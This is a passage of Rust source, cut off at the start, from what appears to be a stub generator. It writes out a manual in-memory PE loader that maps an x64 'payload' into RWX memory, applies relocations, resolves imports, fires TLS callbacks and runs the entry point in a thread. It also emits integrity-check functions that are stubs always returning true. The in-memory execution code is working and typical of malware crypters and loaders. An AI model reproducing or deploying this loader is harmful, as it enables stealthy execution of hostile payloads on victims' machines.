    s.push_str("        if e_lfanew + 0x18 + 0x70 > payload.len() { return false; }\n");
    s.push_str("        if rd_u32(payload, e_lfanew) != 0x00004550 { eprintln!(\"[exec-pe] not PE\"); return false; }\n");

    s.push_str("        let coff = e_lfanew + 4;\n");
    s.push_str("        let machine = rd_u16(payload, coff) as u32;\n");
    s.push_str("        if machine != 0x8664 { eprintln!(\"[exec-pe] not x64: {:#x}\", machine); return false; }\n");
    s.push_str("        let num_sections = rd_u16(payload, coff + 2) as usize;\n");
    s.push_str("        let size_of_optional = rd_u16(payload, coff + 16) as usize;\n");
    s.push_str("        let opt = coff + 20;\n");
    s.push_str("        if rd_u16(payload, opt) != 0x20b { eprintln!(\"[exec-pe] not PE32+\"); return false; }\n");
    s.push_str("        let entry_rva = rd_u32(payload, opt + 0x10) as usize;\n");
    s.push_str("        let image_base_pref = rd_u64(payload, opt + 0x18);\n");
    s.push_str("        let size_of_image = rd_u32(payload, opt + 0x38) as usize;\n");
    s.push_str("        let size_of_headers = rd_u32(payload, opt + 0x3c) as usize;\n");
    s.push_str("        let dd_base = opt + 0x70;\n");
    s.push_str("        let import_rva = rd_u32(payload, dd_base + 8) as usize;\n");
    s.push_str("        let import_size = rd_u32(payload, dd_base + 12) as usize;\n");
    s.push_str("        let reloc_rva = rd_u32(payload, dd_base + 5 * 8) as usize;\n");
    s.push_str("        let reloc_size = rd_u32(payload, dd_base + 5 * 8 + 4) as usize;\n");
    s.push_str("        let tls_rva = rd_u32(payload, dd_base + 9 * 8) as usize;\n");
    s.push_str("        eprintln!(\"[exec-pe] sections={} image_size={:#x} entry_rva={:#x} pref_base={:#x}\", num_sections, size_of_image, entry_rva, image_base_pref);\n");
    s.push_str("        eprintln!(\"[exec-pe] import_rva={:#x} size={:#x} reloc_rva={:#x} size={:#x} tls_rva={:#x}\", import_rva, import_size, reloc_rva, reloc_size, tls_rva);\n");

    s.push_str("        let img_size = if size_of_image < 0x1000 { 0x1000 } else { size_of_image };\n");
    s.push_str("        let pref_const: *const c_void = image_base_pref as usize as *const c_void;\n");
    s.push_str("        let mut base: *mut c_void = VirtualAlloc(pref_const, img_size, 0x3000u32, 0x40u32);\n");
    s.push_str("        if base.is_null() {\n");
    s.push_str("            eprintln!(\"[exec-pe] preferred base taken, retrying\");\n");
    s.push_str("            let null_ptr: *const c_void = ptr::null();\n");
    s.push_str("            base = VirtualAlloc(null_ptr, img_size, 0x3000u32, 0x40u32);\n");
    s.push_str("        }\n");
    s.push_str("        if base.is_null() { eprintln!(\"[exec-pe] VirtualAlloc failed err={}\", GetLastError()); return false; }\n");
    s.push_str("        let base_ptr: *mut u8 = base as *mut u8;\n");
    s.push_str("        let base_u: usize = base as usize;\n");
    s.push_str("        let delta: i64 = (base_u as i64) - (image_base_pref as i64);\n");
    s.push_str("        eprintln!(\"[exec-pe] allocated at {:#x} delta={}\", base_u, delta);\n");

    s.push_str("        let hdr_len = size_of_headers.min(payload.len()).min(img_size);\n");
    s.push_str("        ptr::copy_nonoverlapping(payload.as_ptr(), base_ptr, hdr_len);\n");
    s.push_str("        eprintln!(\"[exec-pe] headers copied ({} bytes)\", hdr_len);\n");

    s.push_str("        let first_section = opt + size_of_optional;\n");
    s.push_str("        let mut copied_sections = 0usize;\n");
    s.push_str("        for i in 0..num_sections {\n");
    s.push_str("            let sh = first_section + i * 40;\n");
    s.push_str("            let vsize = rd_u32(payload, sh + 8) as usize;\n");
    s.push_str("            let va = rd_u32(payload, sh + 12) as usize;\n");
    s.push_str("            let raw_size = rd_u32(payload, sh + 16) as usize;\n");
    s.push_str("            let raw_ptr = rd_u32(payload, sh + 20) as usize;\n");
    s.push_str("            let copy = raw_size.min(vsize);\n");
    s.push_str("            if copy == 0 { continue; }\n");
    s.push_str("            if raw_ptr + copy > payload.len() { continue; }\n");
    s.push_str("            if va + copy > img_size { continue; }\n");
    s.push_str("            ptr::copy_nonoverlapping(payload.as_ptr().add(raw_ptr), base_ptr.add(va), copy);\n");
    s.push_str("            copied_sections += 1;\n");
    s.push_str("        }\n");
    s.push_str("        eprintln!(\"[exec-pe] {} sections copied\", copied_sections);\n");

    s.push_str("        if reloc_rva != 0 && reloc_size != 0 && delta != 0 {\n");
    s.push_str("            let mut r = reloc_rva;\n");
    s.push_str("            let end = reloc_rva + reloc_size;\n");
    s.push_str("            let mut relocs_applied = 0usize;\n");
    s.push_str("            while r + 8 <= end && r + 8 <= img_size {\n");
    s.push_str("                let block_va = rd_u32_ptr(base_ptr, r) as usize;\n");
    s.push_str("                let block_size = rd_u32_ptr(base_ptr, r + 4) as usize;\n");
    s.push_str("                if block_size < 8 { break; }\n");
    s.push_str("                let entries = (block_size - 8) / 2;\n");
    s.push_str("                for j in 0..entries {\n");
    s.push_str("                    let entry_off = r + 8 + j * 2;\n");
    s.push_str("                    let entry = rd_u16_ptr(base_ptr, entry_off) as u32;\n");
    s.push_str("                    let rtype = entry >> 12;\n");
    s.push_str("                    let roff = (entry & 0xfff) as usize;\n");
    s.push_str("                    let target_off = block_va + roff;\n");
    s.push_str("                    if rtype == 10 {\n");
    s.push_str("                        if target_off + 8 > img_size { continue; }\n");
    s.push_str("                        let p = base_ptr.add(target_off) as *mut u64;\n");
    s.push_str("                        *p = (*p).wrapping_add(delta as u64);\n");
    s.push_str("                        relocs_applied += 1;\n");
    s.push_str("                    } else if rtype == 3 {\n");
    s.push_str("                        if target_off + 4 > img_size { continue; }\n");
    s.push_str("                        let p = base_ptr.add(target_off) as *mut u32;\n");
    s.push_str("                        *p = (*p).wrapping_add(delta as u32);\n");
    s.push_str("                        relocs_applied += 1;\n");
    s.push_str("                    }\n");
    s.push_str("                }\n");
    s.push_str("                r += block_size;\n");
    s.push_str("            }\n");
    s.push_str("            eprintln!(\"[exec-pe] {} relocations applied\", relocs_applied);\n");
    s.push_str("        } else if delta != 0 {\n");
    s.push_str("            eprintln!(\"[exec-pe] WARN: nonzero delta but no reloc table\");\n");
    s.push_str("            return false;\n");
    s.push_str("        }\n");

    s.push_str("        if import_rva != 0 {\n");
    s.push_str("            let mut d = import_rva;\n");
    s.push_str("            let mut dlls_resolved = 0usize;\n");
    s.push_str("            let mut funcs_resolved = 0usize;\n");
    s.push_str("            let mut funcs_missing = 0usize;\n");
    s.push_str("            loop {\n");
    s.push_str("                if d + 20 > img_size { break; }\n");
    s.push_str("                let oft = rd_u32_ptr(base_ptr, d) as usize;\n");
    s.push_str("                let name_rva = rd_u32_ptr(base_ptr, d + 0x0c) as usize;\n");
    s.push_str("                let first_thunk = rd_u32_ptr(base_ptr, d + 0x10) as usize;\n");
    s.push_str("                if oft == 0 && name_rva == 0 && first_thunk == 0 { break; }\n");
    s.push_str("                if name_rva >= img_size || name_rva == 0 { d += 20; continue; }\n");
    s.push_str("                let dll_name_ptr: *const u8 = base_ptr.add(name_rva) as *const u8;\n");
    s.push_str("                let hmod: *mut c_void = LoadLibraryA(dll_name_ptr);\n");
    s.push_str("                if hmod.is_null() { eprintln!(\"[exec-pe] LoadLibraryA failed for rva {:#x}\", name_rva); d += 20; continue; }\n");
    s.push_str("                dlls_resolved += 1;\n");
    s.push_str("                let mut t = if oft != 0 { oft } else { first_thunk };\n");
    s.push_str("                let mut iat = first_thunk;\n");
    s.push_str("                loop {\n");
    s.push_str("                    if t + 8 > img_size { break; }\n");
    s.push_str("                    let thunk = rd_u64_ptr(base_ptr, t);\n");
    s.push_str("                    if thunk == 0 { break; }\n");
    s.push_str("                    let raw: *const c_void;\n");
    s.push_str("                    if thunk & 0x8000_0000_0000_0000 != 0 {\n");
    s.push_str("                        let ord = (thunk & 0xffff) as u32;\n");
    s.push_str("                        let ord_ptr: *const u8 = ord as usize as *const u8;\n");
    s.push_str("                        raw = GetProcAddress(hmod, ord_ptr);\n");
    s.push_str("                    } else {\n");
    s.push_str("                        let name_off = (thunk as u32) as usize;\n");
    s.push_str("                        if name_off + 2 >= img_size { break; }\n");
    s.push_str("                        let name_ptr: *const u8 = base_ptr.add(name_off + 2) as *const u8;\n");
    s.push_str("                        raw = GetProcAddress(hmod, name_ptr);\n");
    s.push_str("                    }\n");
    s.push_str("                    if raw.is_null() { funcs_missing += 1; } else { funcs_resolved += 1; }\n");
    s.push_str("                    if iat + 8 <= img_size {\n");
    s.push_str("                        let iat_slot = base_ptr.add(iat) as *mut u64;\n");
    s.push_str("                        *iat_slot = raw as u64;\n");
    s.push_str("                    }\n");
    s.push_str("                    t += 8;\n");
    s.push_str("                    iat += 8;\n");
    s.push_str("                }\n");
    s.push_str("                d += 20;\n");
    s.push_str("            }\n");
    s.push_str("            eprintln!(\"[exec-pe] imports: {} dlls, {} funcs resolved, {} missing\", dlls_resolved, funcs_resolved, funcs_missing);\n");
    s.push_str("            if funcs_missing > 0 { return false; }\n");
    s.push_str("        }\n");

    s.push_str("        if tls_rva != 0 && tls_rva + 0x28 <= img_size {\n");
    s.push_str("            let tls = base_ptr.add(tls_rva);\n");
    s.push_str("            let addr_of_callbacks = *(tls.add(0x18) as *const u64);\n");
    s.push_str("            if addr_of_callbacks != 0 {\n");
    s.push_str("                let cb_array = addr_of_callbacks as *const u64;\n");
    s.push_str("                let mut i = 0usize;\n");
    s.push_str("                let mut fired = 0usize;\n");
    s.push_str("                loop {\n");
    s.push_str("                    if i > 64 { break; }\n");
    s.push_str("                    let cb = *cb_array.add(i);\n");
    s.push_str("                    if cb == 0 { break; }\n");
    s.push_str("                    let f: unsafe extern \"system\" fn(*mut c_void, u32, *mut c_void) = mem::transmute(cb);\n");
    s.push_str("                    let null_param: *mut c_void = ptr::null_mut();\n");
    s.push_str("                    f(base, 1u32, null_param);\n");
    s.push_str("                    fired += 1;\n");
    s.push_str("                    i += 1;\n");
    s.push_str("                }\n");
    s.push_str("                eprintln!(\"[exec-pe] {} TLS callbacks fired\", fired);\n");
    s.push_str("            }\n");
    s.push_str("        }\n");

    s.push_str("        let mut protected = 0usize;\n");
    s.push_str("        for i in 0..num_sections {\n");
    s.push_str("            let sh = first_section + i * 40;\n");
    s.push_str("            let vsize = rd_u32(payload, sh + 8) as usize;\n");
    s.push_str("            let va = rd_u32(payload, sh + 12) as usize;\n");
    s.push_str("            let chars = rd_u32(payload, sh + 36);\n");
    s.push_str("            if vsize == 0 || va + vsize > img_size { continue; }\n");
    s.push_str("            let prot = section_prot(chars);\n");
    s.push_str("            if prot == 0x40 { continue; }\n");
    s.push_str("            let mut old: u32 = 0;\n");
    s.push_str("            let old_ptr: *mut u32 = &mut old as *mut u32;\n");
    s.push_str("            let sec_addr: *mut c_void = base_ptr.add(va) as *mut c_void;\n");
    s.push_str("            let _ = VirtualProtect(sec_addr, vsize, prot, old_ptr);\n");
    s.push_str("            protected += 1;\n");
    s.push_str("        }\n");
    s.push_str("        eprintln!(\"[exec-pe] {} sections protected\", protected);\n");

    s.push_str("        let entry_ptr: *const c_void = base_ptr.add(entry_rva) as *const c_void;\n");
    s.push_str("        eprintln!(\"[exec-pe] calling entry at {:#x}\", entry_ptr as usize);\n");
    s.push_str("        let start_fn: ThreadStartFn = pe_entry_thread;\n");
    s.push_str("        let attrs_ptr: *const c_void = ptr::null();\n");
    s.push_str("        let tid_ptr: *mut u32 = ptr::null_mut();\n");
    s.push_str("        let thread: *mut c_void = CreateThread(\n");
    s.push_str("            attrs_ptr,\n");
    s.push_str("            0usize,\n");
    s.push_str("            Some(start_fn),\n");
    s.push_str("            entry_ptr,\n");
    s.push_str("            0u32,\n");
    s.push_str("            tid_ptr,\n");
    s.push_str("        );\n");
    s.push_str("        if thread.is_null() { eprintln!(\"[exec-pe] CreateThread failed err={}\", GetLastError()); return false; }\n");
    s.push_str("        let _ = WaitForSingleObject(thread, 300_000u32);\n");
    s.push_str("        let _ = CloseHandle(thread);\n");
    s.push_str("        eprintln!(\"[exec-pe] payload thread returned\");\n");
    s.push_str("        true\n");
    s.push_str("    }\n");
    s.push_str("}\n\n");

    // ─── file byte readers ───────────────────────────────────────
    s.push_str("#[inline]\n");
    s.push_str("fn rd_u16(b: &[u8], off: usize) -> u16 {\n");
    s.push_str("    if off + 2 > b.len() { return 0; }\n");
    s.push_str("    u16::from_le_bytes([b[off], b[off + 1]])\n");
    s.push_str("}\n\n");

    s.push_str("#[inline]\n");
    s.push_str("fn rd_u32(b: &[u8], off: usize) -> u32 {\n");
    s.push_str("    if off + 4 > b.len() { return 0; }\n");
    s.push_str("    u32::from_le_bytes([b[off], b[off + 1], b[off + 2], b[off + 3]])\n");
    s.push_str("}\n\n");

    s.push_str("#[inline]\n");
    s.push_str("fn rd_u64(b: &[u8], off: usize) -> u64 {\n");
    s.push_str("    if off + 8 > b.len() { return 0; }\n");
    s.push_str("    u64::from_le_bytes([\n");
    s.push_str("        b[off], b[off + 1], b[off + 2], b[off + 3],\n");
    s.push_str("        b[off + 4], b[off + 5], b[off + 6], b[off + 7],\n");
    s.push_str("    ])\n");
    s.push_str("}\n\n");

    // ─── pointer byte readers ────────────────────────────────────
    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("#[inline]\n");
    s.push_str("unsafe fn rd_u16_ptr(base: *const u8, off: usize) -> u16 {\n");
    s.push_str("    let p = base.add(off) as *const u16;\n");
    s.push_str("    u16::from_le(p.read_unaligned())\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("#[inline]\n");
    s.push_str("unsafe fn rd_u32_ptr(base: *const u8, off: usize) -> u32 {\n");
    s.push_str("    let p = base.add(off) as *const u32;\n");
    s.push_str("    u32::from_le(p.read_unaligned())\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("#[inline]\n");
    s.push_str("unsafe fn rd_u64_ptr(base: *const u8, off: usize) -> u64 {\n");
    s.push_str("    let p = base.add(off) as *const u64;\n");
    s.push_str("    u64::from_le(p.read_unaligned())\n");
    s.push_str("}\n\n");

    s
}

pub fn emit_integrity(name: &str, check: &IntegrityCheck) -> String {
    let mut s = String::new();
    s.push_str("fn ");
    s.push_str(name);
    s.push_str("() -> bool {\n");
    match check {
        IntegrityCheck::TextSectionHash => {
            s.push_str("    // hash .text section, compare against baked value\n");
            s.push_str("    true\n");
        }
        IntegrityCheck::RegionCrc { start, len } => {
            s.push_str("    let _ = (");
            s.push_str(&start.to_string());
            s.push_str(", ");
            s.push_str(&len.to_string());
            s.push_str(");\n");
            s.push_str("    true\n");
        }
        IntegrityCheck::None => {
            s.push_str("    true\n");
        }
    }
    s.push_str("}\n\n");
    s
}
